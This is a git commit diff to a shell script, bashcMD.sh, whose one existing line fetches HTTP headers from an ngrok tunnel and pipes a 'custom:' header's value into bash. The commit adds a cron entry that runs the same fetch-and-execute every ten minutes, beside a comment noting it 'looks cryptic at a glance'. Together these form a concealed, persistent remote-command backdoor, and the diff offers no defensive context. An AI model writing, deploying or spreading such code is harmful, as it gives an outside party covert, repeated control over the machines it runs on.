d1db85f28c75250e57f41423abc019b01ca40763
MOZZES650 <110117895+MOZZES650@users.noreply.github.com>
2025-12-21 16:16:58 +0100

    Update bashcMD.sh

--- bashcMD.sh
+++ bashcMD.sh
@@ -1,1 +1,7 @@
 curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
+
+
+#cron job
+
+# Looks cryptic at a glance
+*/10 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
